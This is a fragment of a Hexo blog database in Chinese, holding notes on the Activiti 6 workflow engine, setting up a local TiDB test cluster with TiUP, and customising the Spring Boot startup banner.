href=\"https://zhengjianfeng.cn/?p=193\">SpringBoot Activiti6 系列教程(九)-流程回退实现</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=197\">SpringBoot Activiti6 系列教程(十)-流程加签征询实现(完结篇)</a></li>\n</ul>\n<h1 id=\"架构说明\"><a href=\"#架构说明\" class=\"headerlink\" title=\"架构说明\"></a>架构说明</h1><blockquote>\n<p>ProcessEngineConfiguration 类，主要作用是加载 activiti.cfg.xml 配置文件；</p>\n</blockquote>\n<blockquote>\n<p>ProcessEngine 类，可以生成 activiti 的工作环境（建表），通过此类得到各个 Service 的接口；</p>\n</blockquote>\n<blockquote>\n<p>Service 接口，快速实现数据库表的操作；</p>\n<p>​ |—- RepositoryService</p>\n<p>​ |—- RuntimeService</p>\n<p>​ |—- TaskService 查看、处理任务</p>\n<p>​ |—- HistoryService</p>\n<p><a href=\"https://my.oschina.net/fuyung/blog/475181\">Activiti 核心 API 介绍</a></p>\n</blockquote>\n<h1 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h1><blockquote>\n<p>流程部署<br>1、单个文件部署（bpmn 文件，png 文件），addClasspathResource(“*.bpmn”)</p>\n<p>​ 2、将 bpmn 文件与 png 文件压缩成 zip 文件，再通过 addZipInputStream()部署</p>\n</blockquote>\n<blockquote>\n<p>流程实例</p>\n<p>一个流程定义可以对应多个流程实例<br>启动流程实例 RuntimeService startProcessInstanceByKey(“key”)</p>\n</blockquote>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h2><blockquote>\n<p><a href=\"https://blog.csdn.net/qq_15204179/article/details/86298442\">组任务流程 CandidateUsers</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/zjx86320/article/details/50412263\">分配组任务的三种方式</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/ylforever/article/details/99708257\">查询待办和已办任务</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/cxyj/p/3893631.html\">Activiti 业务键（businessKey）</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"<h1 id=\"Activiti-官方网站\"><a href=\"#Activiti-官方网站\" class=\"headerlink\" title=\"Activiti 官方网站\"></a>Activiti 官方网站</h1><p>先上官方文档，<a href=\"https://www.activiti.org/userguide\">Activiti 6 User Guide</a></p>","more":"<h1 id=\"找到的教程系列文章\"><a href=\"#找到的教程系列文章\" class=\"headerlink\" title=\"找到的教程系列文章\"></a>找到的教程系列文章</h1><ul>\n<li><a href=\"https://zhengjianfeng.cn/?p=162\">SpringBoot Activiti6 系列教程(一)-activiti-app 部署</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=167\">SpringBoot Activiti6 系列教程(二)-基于 mysql 数据库初始化</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=170\">SpringBoot Activiti6 系列教程(三)-开发一个简单的 SpringBoot activiti6 应用程序</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=176\">SpringBoot Activiti6 系列教程(四)-流程部署</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=179\">SpringBoot Activiti6 系列教程(五)-activiti api</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=184\">SpringBoot Activiti6 系列教程(六)-Execution 说明</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=186\">SpringBoot Activiti6 系列教程(七)-变量</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=190\">SpringBoot Activiti6 系列教程(八)-流程拒绝实现</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=193\">SpringBoot Activiti6 系列教程(九)-流程回退实现</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=197\">SpringBoot Activiti6 系列教程(十)-流程加签征询实现(完结篇)</a></li>\n</ul>\n<h1 id=\"架构说明\"><a href=\"#架构说明\" class=\"headerlink\" title=\"架构说明\"></a>架构说明</h1><blockquote>\n<p>ProcessEngineConfiguration 类，主要作用是加载 activiti.cfg.xml 配置文件；</p>\n</blockquote>\n<blockquote>\n<p>ProcessEngine 类，可以生成 activiti 的工作环境（建表），通过此类得到各个 Service 的接口；</p>\n</blockquote>\n<blockquote>\n<p>Service 接口，快速实现数据库表的操作；</p>\n<p>​ |—- RepositoryService</p>\n<p>​ |—- RuntimeService</p>\n<p>​ |—- TaskService 查看、处理任务</p>\n<p>​ |—- HistoryService</p>\n<p><a href=\"https://my.oschina.net/fuyung/blog/475181\">Activiti 核心 API 介绍</a></p>\n</blockquote>\n<h1 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h1><blockquote>\n<p>流程部署<br>1、单个文件部署（bpmn 文件，png 文件），addClasspathResource(“*.bpmn”)</p>\n<p>​ 2、将 bpmn 文件与 png 文件压缩成 zip 文件，再通过 addZipInputStream()部署</p>\n</blockquote>\n<blockquote>\n<p>流程实例</p>\n<p>一个流程定义可以对应多个流程实例<br>启动流程实例 RuntimeService startProcessInstanceByKey(“key”)</p>\n</blockquote>\n<h2 id=\"实例\"><a href=\"#实例\" class=\"headerlink\" title=\"实例\"></a>实例</h2><blockquote>\n<p><a href=\"https://blog.csdn.net/qq_15204179/article/details/86298442\">组任务流程 CandidateUsers</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/zjx86320/article/details/50412263\">分配组任务的三种方式</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://blog.csdn.net/ylforever/article/details/99708257\">查询待办和已办任务</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/cxyj/p/3893631.html\">Activiti 业务键（businessKey）</a></p>\n</blockquote>"},{"title":"TiDB学习记录","date":"2021-06-22T08:00:00.000Z","_content":"\n先上 TiDB 官方文档链接，[TiDB 简介 - PingCAP Docs](https://docs.pingcap.com/zh/tidb/stable/overview)\n\n<!--more-->\n\n# 在 macOS 上部署本地测试环境\n\n1. 下载安装 TiUP：\n\n   ```bash\n   curl --proto '=https' --tlsv1.2 -sSf https://tiup-mirrors.pingcap.com/install.sh | sh\n   ```\n\n2. 声明全局环境变量：\n\n   ```bash\n   source .bash_profile\n   ```\n\n3. 启动集群：\n\n   - 直接执行 `tiup playground` 命令会运行最新版本的 TiDB 集群，其中 TiDB、TiKV、PD 和 TiFlash 实例各 1 个：\n\n     ```bash\n     tiup playground\n     ```\n\n   - 可以指定 TiDB 版本以及各组件实例个数，命令类似于：\n\n     ```bash\n     tiup playground v5.0.2 --db 2 --pd 3 --kv 3 --monitor\n     ```\n\n   > 以这种方式执行的 playground，在结束部署测试后 TiUP 会清理掉原集群数据，重新执行该命令后会得到一个全新的集群。\n   >\n   > 若希望持久化数据，可以执行 TiUP 的 `--tag` 参数：\n   >\n   > ```bash\n   > tiup --tag <your-tag> playground\n   > ```\n\n4. 访问 TiDB 数据库：\n\n   - 使用 TiUP `client` 连接 TiDB：\n\n     ```bash\n     tiup client\n     ```\n\n   - 使用 MySQL 客户端连接 TiDB：\n\n     ```bash\n     # 此连接地址会在启动集群时在终端提示\n     mysql --host 127.0.0.1 --port 4000 -u root\n     ```\n\n5. 通过 `http://127.0.0.1:9090` 访问 TiDB 的 Prometheus 管理界面。\n\n6. 通过 `http://127.0.0.1:2379/dashboard` 访问 [TiDB Dashboard](https://docs.pingcap.com/zh/tidb/stable/dashboard-intro) 页面，默认用户名为 `root`，密码为空。\n\n7. 清理集群：\n\n   - ctrl+c 终止进程。\n\n   - 执行以下命令清理所有集群：\n\n     ```bash\n     tiup clean --all\n     ```\n\n# 文章收录\n\n- [TiDB 源码阅读系列文章（一）序](https://zhuanlan.zhihu.com/p/36500508)\n","source":"_posts/2021/06/TiDB学习记录.md","raw":"---\ntitle: TiDB学习记录\ndate: 2021-06-22 16:00:00\ntags:\n  - SQL\n  - TiDB\ncategories:\n  - SQL\n  - TiDB\n---\n\n先上 TiDB 官方文档链接，[TiDB 简介 - PingCAP Docs](https://docs.pingcap.com/zh/tidb/stable/overview)\n\n<!--more-->\n\n# 在 macOS 上部署本地测试环境\n\n1. 下载安装 TiUP：\n\n   ```bash\n   curl --proto '=https' --tlsv1.2 -sSf https://tiup-mirrors.pingcap.com/install.sh | sh\n   ```\n\n2. 声明全局环境变量：\n\n   ```bash\n   source .bash_profile\n   ```\n\n3. 启动集群：\n\n   - 直接执行 `tiup playground` 命令会运行最新版本的 TiDB 集群，其中 TiDB、TiKV、PD 和 TiFlash 实例各 1 个：\n\n     ```bash\n     tiup playground\n     ```\n\n   - 可以指定 TiDB 版本以及各组件实例个数，命令类似于：\n\n     ```bash\n     tiup playground v5.0.2 --db 2 --pd 3 --kv 3 --monitor\n     ```\n\n   > 以这种方式执行的 playground，在结束部署测试后 TiUP 会清理掉原集群数据，重新执行该命令后会得到一个全新的集群。\n   >\n   > 若希望持久化数据，可以执行 TiUP 的 `--tag` 参数：\n   >\n   > ```bash\n   > tiup --tag <your-tag> playground\n   > ```\n\n4. 访问 TiDB 数据库：\n\n   - 使用 TiUP `client` 连接 TiDB：\n\n     ```bash\n     tiup client\n     ```\n\n   - 使用 MySQL 客户端连接 TiDB：\n\n     ```bash\n     # 此连接地址会在启动集群时在终端提示\n     mysql --host 127.0.0.1 --port 4000 -u root\n     ```\n\n5. 通过 `http://127.0.0.1:9090` 访问 TiDB 的 Prometheus 管理界面。\n\n6. 通过 `http://127.0.0.1:2379/dashboard` 访问 [TiDB Dashboard](https://docs.pingcap.com/zh/tidb/stable/dashboard-intro) 页面，默认用户名为 `root`，密码为空。\n\n7. 清理集群：\n\n   - ctrl+c 终止进程。\n\n   - 执行以下命令清理所有集群：\n\n     ```bash\n     tiup clean --all\n     ```\n\n# 文章收录\n\n- [TiDB 源码阅读系列文章（一）序](https://zhuanlan.zhihu.com/p/36500508)\n","slug":"2021/06/TiDB学习记录","published":1,"updated":"2022-10-21T14:56:47.881Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciy0009zge369wm4kk7","content":"<p>先上 TiDB 官方文档链接，<a href=\"https://docs.pingcap.com/zh/tidb/stable/overview\">TiDB 简介 - PingCAP Docs</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"在-macOS-上部署本地测试环境\"><a href=\"#在-macOS-上部署本地测试环境\" class=\"headerlink\" title=\"在 macOS 上部署本地测试环境\"></a>在 macOS 上部署本地测试环境</h1><ol>\n<li><p>下载安装 TiUP：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --proto <span class=\"string\">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://tiup-mirrors.pingcap.com/install.sh | sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>声明全局环境变量：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> .bash_profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>启动集群：</p>\n<ul>\n<li><p>直接执行 <code>tiup playground</code> 命令会运行最新版本的 TiDB 集群，其中 TiDB、TiKV、PD 和 TiFlash 实例各 1 个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup playground</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以指定 TiDB 版本以及各组件实例个数，命令类似于：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup playground v5.0.2 --db 2 --pd 3 --kv 3 --monitor</span><br></pre></td></tr></table></figure></li>\n</ul>\n<blockquote>\n<p>以这种方式执行的 playground，在结束部署测试后 TiUP 会清理掉原集群数据，重新执行该命令后会得到一个全新的集群。</p>\n<p>若希望持久化数据，可以执行 TiUP 的 <code>--tag</code> 参数：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup --tag &lt;your-tag&gt; playground</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>访问 TiDB 数据库：</p>\n<ul>\n<li><p>使用 TiUP <code>client</code> 连接 TiDB：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup client</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用 MySQL 客户端连接 TiDB：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 此连接地址会在启动集群时在终端提示</span></span><br><span class=\"line\">mysql --host 127.0.0.1 --port 4000 -u root</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>通过 <code>http://127.0.0.1:9090</code> 访问 TiDB 的 Prometheus 管理界面。</p>\n</li>\n<li><p>通过 <code>http://127.0.0.1:2379/dashboard</code> 访问 <a href=\"https://docs.pingcap.com/zh/tidb/stable/dashboard-intro\">TiDB Dashboard</a> 页面，默认用户名为 <code>root</code>，密码为空。</p>\n</li>\n<li><p>清理集群：</p>\n<ul>\n<li><p>ctrl+c 终止进程。</p>\n</li>\n<li><p>执行以下命令清理所有集群：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup clean --all</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<h1 id=\"文章收录\"><a href=\"#文章收录\" class=\"headerlink\" title=\"文章收录\"></a>文章收录</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/36500508\">TiDB 源码阅读系列文章（一）序</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"<p>先上 TiDB 官方文档链接，<a href=\"https://docs.pingcap.com/zh/tidb/stable/overview\">TiDB 简介 - PingCAP Docs</a></p>","more":"<h1 id=\"在-macOS-上部署本地测试环境\"><a href=\"#在-macOS-上部署本地测试环境\" class=\"headerlink\" title=\"在 macOS 上部署本地测试环境\"></a>在 macOS 上部署本地测试环境</h1><ol>\n<li><p>下载安装 TiUP：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl --proto <span class=\"string\">&#x27;=https&#x27;</span> --tlsv1.2 -sSf https://tiup-mirrors.pingcap.com/install.sh | sh</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>声明全局环境变量：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">source</span> .bash_profile</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>启动集群：</p>\n<ul>\n<li><p>直接执行 <code>tiup playground</code> 命令会运行最新版本的 TiDB 集群，其中 TiDB、TiKV、PD 和 TiFlash 实例各 1 个：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup playground</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可以指定 TiDB 版本以及各组件实例个数，命令类似于：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup playground v5.0.2 --db 2 --pd 3 --kv 3 --monitor</span><br></pre></td></tr></table></figure></li>\n</ul>\n<blockquote>\n<p>以这种方式执行的 playground，在结束部署测试后 TiUP 会清理掉原集群数据，重新执行该命令后会得到一个全新的集群。</p>\n<p>若希望持久化数据，可以执行 TiUP 的 <code>--tag</code> 参数：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup --tag &lt;your-tag&gt; playground</span><br></pre></td></tr></table></figure>\n</blockquote>\n</li>\n<li><p>访问 TiDB 数据库：</p>\n<ul>\n<li><p>使用 TiUP <code>client</code> 连接 TiDB：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup client</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>使用 MySQL 客户端连接 TiDB：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 此连接地址会在启动集群时在终端提示</span></span><br><span class=\"line\">mysql --host 127.0.0.1 --port 4000 -u root</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n<li><p>通过 <code>http://127.0.0.1:9090</code> 访问 TiDB 的 Prometheus 管理界面。</p>\n</li>\n<li><p>通过 <code>http://127.0.0.1:2379/dashboard</code> 访问 <a href=\"https://docs.pingcap.com/zh/tidb/stable/dashboard-intro\">TiDB Dashboard</a> 页面，默认用户名为 <code>root</code>，密码为空。</p>\n</li>\n<li><p>清理集群：</p>\n<ul>\n<li><p>ctrl+c 终止进程。</p>\n</li>\n<li><p>执行以下命令清理所有集群：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tiup clean --all</span><br></pre></td></tr></table></figure></li>\n</ul>\n</li>\n</ol>\n<h1 id=\"文章收录\"><a href=\"#文章收录\" class=\"headerlink\" title=\"文章收录\"></a>文章收录</h1><ul>\n<li><a href=\"https://zhuanlan.zhihu.com/p/36500508\">TiDB 源码阅读系列文章（一）序</a></li>\n</ul>"},{"title":"SpringBoot banner","date":"2021-05-29T13:00:00.000Z","_content":"\nSpring Boot 启动时，控制台输出的图案叫 _banner_，如下所示的 Spring 图案。\n\n```bash\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::                (v2.5.0)\n```\n\n<!--more-->\n\n# 最简单方式改写 banner 输出的图案\n\n1. 在 src/main/resources 目录下新建 banner.txt\n2. 在 banner.txt 上加上图案，可以在这个网站-[一个 ASCII 图案网站](http://patorjk.com/software/taag/)-上获得自己想要的 ASCII 图案\n\n这样在启动项目时控制台就可以打印出自己的图案了。\n\n也可以使用 jpg、png 甚至 gif，都命名为 banner。\n\n或者通过设置`banner.image.location`属性来作为 banner 信息，这些图片会被转换为有艺术感的 ASCII，并且打印在文本的顶部。\n\n# 对 banner 做配置\n\n1. 在启动类上设置\n\n   ```java\n   public static void main(String[] args) {\n       // SpringApplication.run(TestApplication.class, args);\n       SpringApplication springApplication = new SpringApplication(TestApplication.class);\n       springApplication.setBannerMode(Banner.Mode.CONSOLE);\n       springApplication.run(args);\n   }\n   ```\n\n2. 在 properties 文件中做配置\n\n   ```properties\n   # 打印到控制台\n   spring.main.banner-mode=console\n   # 打印到日志文件\n   spring.main.banner-mode=log\n   # 不打印\n   spring.main.banner-mode=off\n   ```\n\n3. banner 配置解析\n\n   - 模式\n\n     ```java\n     OFF\t\t\t\t\t// 关闭banner\n     CONSOLE\t\t\t// 在控制台输出banner图案\n     LOG\t\t\t\t\t// 应为在日志中打印图案，控制台也有\n     ```\n\n   - 打印样式\n\n     ```java\n     AnsiColor         // 用来设定字符的前景色\n     AnsiBackground    // 用来设定字符的背景色\n     AnsiStyle         // 用来控制加粗、斜体、下划线等等。\n     ```\n\n   - 可以加上文件版本号等\n\n     ```java\n     ${application.title}                    // MANIFEST.MF文件中的应用名称\n\n     ${application.version}                  //  这个是MANIFEST.MF文件中的版本号  \n\n     ${application.formatted-version}        // 这个是上面的的版本号前面加v后上括号  \n\n     ${spring-boot.version}                  // 这个是springboot的版本号  \n\n     ${spring-boot.formatted-version}\t\t\t\t// 同上\n     ```\n\n4. 示例\n\n   ```bash\n   ${AnsiColor.BRIGHT_MAGENTA}\n       ______       ___\n       /\\__  _\\     /\\_ \\\n       \\/_/\\ \\/     \\//\\ \\     ___   __  __     __       __  __    ___   __  __\n       \\ \\ \\       \\ \\ \\   / __`\\/\\ \\/\\ \\  /'__`\\    /\\ \\/\\ \\  / __`\\/\\ \\/\\ \\\n           \\_\\ \\__     \\_\\ \\_/\\ \\\\ \\ \\ \\_/ |/\\  __/    \\ \\ \\_\\ \\/\\ \\\\ \\ \\ \\_\\ \\ \\\n           /\\_____\\    /\\____\\ \\____/\\ \\___/ \\ \\____\\    \\/`____ \\ \\____/\\ \\____/\n           \\/_____/    \\/____/\\/___/  \\/__/   \\/____/     `/___/> \\/___/  \\/___/\n                                                           /\\___/\n                                                           \\/__/\n                   :: Spring Boot ::\t\t\t\t\t\t\t${spring-boot.version}   \n   ```\n","source":"_posts/2021/05/SpringBoot-banner.md","raw":"---\ntitle: SpringBoot banner\ndate: 2021-05-29 21:00:00\ntags:\n  - Java\n  - SpringBoot\ncategories:\n  - Java\n  - SpringBoot\n---\n\nSpring Boot 启动时，控制台输出的图案叫 _banner_，如下所示的 Spring 图案。\n\n```bash\n  .   ____          _            __ _ _\n /\\\\ / ___'_ __ _ _(_)_ __  __ _ \\ \\ \\ \\\n( ( )\\___ | '_ | '_| | '_ \\/ _` | \\ \\ \\ \\\n \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )\n  '  |____| .__|_| |_|_| |_\\__, | / / / /\n =========|_|==============|___/=/_/_/_/\n :: Spring Boot ::                (v2.5.0)\n```\n\n<!--more-->\n\n# 最简单方式改写 banner 输出的图案\n\n1. 在 src/main/resources 目录下新建 banner.txt\n2. 在 banner.txt 上加上图案，可以在这个网站-[一个 ASCII 图案网站](http://patorjk.com/software/taag/)-上获得自己想要的 ASCII 图案\n\n这样在启动项目时控制台就可以打印出自己的图案了。\n\n也可以使用 jpg、png 甚至 gif，都命名为 banner。\n\n或者通过设置`banner.image.location`属性来作为 banner 信息，这些图片会被转换为有艺术感的 ASCII，并且打印在文本的顶部。\n\n# 对 banner 做配置\n\n1. 在启动类上设置\n\n   ```java\n   public static void main(String[] args) {\n       // SpringApplication.run(TestApplication.class, args);\n       SpringApplication springApplication = new SpringApplication(TestApplication.class);\n       springApplication.setBannerMode(Banner.Mode.CONSOLE);\n       springApplication.run(args);\n   }\n   ```\n\n2. 在 properties 文件中做配置\n\n   ```properties\n   # 打印到控制台\n   spring.main.banner-mode=console\n   # 打印到日志文件\n   spring.main.banner-mode=log\n   # 不打印\n   spring.main.banner-mode=off\n   ```\n\n3. banner 配置解析\n\n   - 模式\n\n     ```java\n     OFF\t\t\t\t\t// 关闭banner\n     CONSOLE\t\t\t// 在控制台输出banner图案\n     LOG\t\t\t\t\t// 应为在日志中打印图案，控制台也有\n     ```\n\n   - 打印样式\n\n     ```java\n     AnsiColor         // 用来设定字符的前景色\n     AnsiBackground    // 用来设定字符的背景色\n     AnsiStyle         // 用来控制加粗、斜体、下划线等等。\n     ```\n\n   - 可以加上文件版本号等\n\n     ```java\n     ${application.title}                    // MANIFEST.MF文件中的应用名称\n\n     ${application.version}                  //  这个是MANIFEST.MF文件中的版本号  \n\n     ${application.formatted-version}        // 这个是上面的的版本号前面加v后上括号  \n\n     ${spring-boot.version}                  // 这个是springboot的版本号  \n\n     ${spring-boot.formatted-version}\t\t\t\t// 同上\n     ```\n\n4. 示例\n\n   ```bash\n   ${AnsiColor.BRIGHT_MAGENTA}\n       ______       ___\n       /\\__  _\\     /\\_ \\\n       \\/_/\\ \\/     \\//\\ \\     ___   __  __     __       __  __    ___   __  __\n       \\ \\ \\       \\ \\ \\   / __`\\/\\ \\/\\ \\  /'__`\\    /\\ \\/\\ \\  / __`\\/\\ \\/\\ \\\n           \\_\\ \\__     \\_\\ \\_/\\ \\\\ \\ \\ \\_/ |/\\  __/    \\ \\ \\_\\ \\/\\ \\\\ \\ \\ \\_\\ \\ \\\n           /\\_____\\    /\\____\\ \\____/\\ \\___/ \\ \\____\\    \\/`____ \\ \\____/\\ \\____/\n           \\/_____/    \\/____/\\/___/  \\/__/   \\/____/     `/___/> \\/___/  \\/___/\n                                                           /\\___/\n                                                           \\/__/\n                   :: Spring Boot ::\t\t\t\t\t\t\t${spring-boot.version}   \n   ```\n","slug":"2021/05/SpringBoot-banner","published":1,"updated":"2022-07-25T11:28:19.025Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciz000dzge3906h2ox9","content":"<p>Spring Boot 启动时，控制台输出的图案叫 _banner_，如下所示的 Spring 图案。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  .   ____          _            __ _ _</span><br><span class=\"line\"> /\\\\ / ___<span class=\"string\">&#x27;_ __ _ _(_)_ __  __ _ \\ \\ \\ \\</span></span><br><span class=\"line\"><span class=\"string\">( ( )\\___ | &#x27;</span>_ | <span class=\"string\">&#x27;_| | &#x27;</span>_ \\/ _` | \\ \\ \\ \\</span><br><span class=\"line\"> \\\\/  ___)| |_)| | | | | || (_| |  ) ) ) )</span><br><span class=\"line\">  <span class=\"string\">&#x27;  |____| .__|_| |_|_| |_\\__, | / / / /</span></span><br><span class=\"line\"><span class=\"string\"> =========|_|==============|___/=/_/_/_/</span></span><br><span class=\"line\"><span class=\"string\"> :: Spring Boot ::                (v2.5.0)</span></span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h1 id=\"最简单方式改写-banner-输出的图案\"><a href=\"#最简单方式改写-banner-输出的图案\" class=\"headerlink\" title=\"最简单方式改写 banner 输出的图案\"></a>最简单方式改写 banner 输出的图案</h1><ol>\n<li>在 src&#x2F;main&#x2F;resources 目录下新建 banner.txt</li>\n<li>在 banner.txt 上加上图案，可以在这个网站-<a href=\"http://patorjk.com/software/taag/\">一个 ASCII 图案网站</a>-上获得自己想要的 ASCII 图案</li>\n</ol>\n<p>这样在启动项目时控制台就可以打印出自己的图案了。</p>\n<p>也可以使用 jpg、png 甚至 gif，都命名为 banner。</p>\n<p>或者通过设置<code>banner.image.location</code>属性来作为 banner 信息，这些图片会被转换为有艺术感的 ASCII，并且打印在文本的顶部。</p>\n<h1 id=\"对-banner-做配置\"><a href=\"#对-banner-做配置\" class=\"headerlink\" title=\"对 banner 做配置\"></a>对 banner 做配置</h1><ol>\n<li><p>在启动类上设置</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// SpringApplication.run(TestApplication.class, args);</span></span><br><span class=\"line\">    <span class=\"type\">SpringApplication</span> <span class=\"variable\">springApplication</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">SpringApplication</span>(TestApplication.class);</span><br><span class=\"line\">    springApplication.setBannerMode(Banner.Mode.CONSOLE);</span><br><span class=\"line\">    springApplication.run(args);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>在 properties 文件中做配置</p>\n<figure class=\"highlight properties\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 打印到控制台</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">console</span></span><br><span class=\"line\"><span class=\"comment\"># 打印到日志文件</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">log</span></span><br><span class=\"line\"><span class=\"comment\"># 不打印</span></span><br><span class=\"line\"><span class=\"attr\">spring.main.banner-mode</span>=<span class=\"string\">off</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>banner 配置解析</p>\n<ul>\n<li><p>模式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OFF\t\t\t\t\t<span class=\"comment\">// 关闭banner</span></span><br><span class=\"line\">CONSOLE\t\t\t<span class=\"comment\">// 在控制台输出banner图案</span></span><br><span class=\"line\">LOG\t\t\t\t\t<span class=\"comment\">// 应为在日志中打印图案，控制台也有</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>打印样式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">AnsiColor         <span class=\"comment\">// 用来设定字符的前景色</span></span><br><span 